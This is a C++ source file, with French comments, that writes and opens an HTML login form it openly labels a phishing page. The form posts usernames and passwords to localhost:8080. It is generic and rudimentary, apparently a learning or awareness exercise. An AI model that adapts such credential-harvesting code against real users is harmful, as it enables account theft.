#include "include/page.hpp"
#include "include/utils.hpp"
#include <iostream>
#include <fstream>

void open_login_page() {
    std::string command = "open phishing_pages/phishing_page_0.html";  // Utilise "open" pour macOS
    system(command.c_str());  // Ouvre la page dans le navigateur par défaut
}

void create_page(int page_choice) {
    // Créer le répertoire si nécessaire
    create_directory_if_needed("phishing_pages");

    // Contenu de la page de phishing
    std::string file_name = "phishing_page_" + std::to_string(page_choice) + ".html";
    std::string file_path = "phishing_pages/" + file_name;
    std::ofstream file(file_path);

    if (file.is_open()) {
        // Début de la structure HTML
        file << "<!DOCTYPE html>\n";
        file << "<html lang=\"en\">\n";
        file << "<head>\n";
        file << "<meta charset=\"UTF-8\">\n";
        file << "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n";
        file << "<title>Login - Phishing Page</title>\n";
        file << "<style>\n";
        file << "body { font-family: Arial, sans-serif; background-color: #f4f4f4; text-align: center; padding: 50px; }\n";
        file << "h1 { color: #333; }\n";
        file << "input[type=text], input[type=password] { width: 300px; padding: 10px; margin: 10px 0; border: 1px solid #ccc; }\n";
        file << "input[type=submit] { padding: 10px 20px; background-color: #4CAF50; color: white; border: none; cursor: pointer; }\n";
        file << "</style>\n";
        file << "</head>\n";
        file << "<body>\n";

        // Formulaire de connexion
        file << "<h1>Login Page</h1>\n";
        file << "<form action=\"http://localhost:8080/\" method=\"POST\">\n";  // Changez cette URL si nécessaire
        file << "<input type=\"text\" name=\"username\" placeholder=\"Username\" required>\n";
        file << "<input type=\"password\" name=\"password\" placeholder=\"Password\" required>\n";
        file << "<input type=\"submit\" value=\"Login\">\n";
        file << "</form>\n";
        
        // Fermeture de la page HTML
        file << "</body>\n";
        file << "</html>\n";

        file.close();
        std::cout << "Phishing page created at " << file_path << std::endl;
    } else {
        std::cerr << "Error: Unable to create phishing page." << std::endl;
    }
}
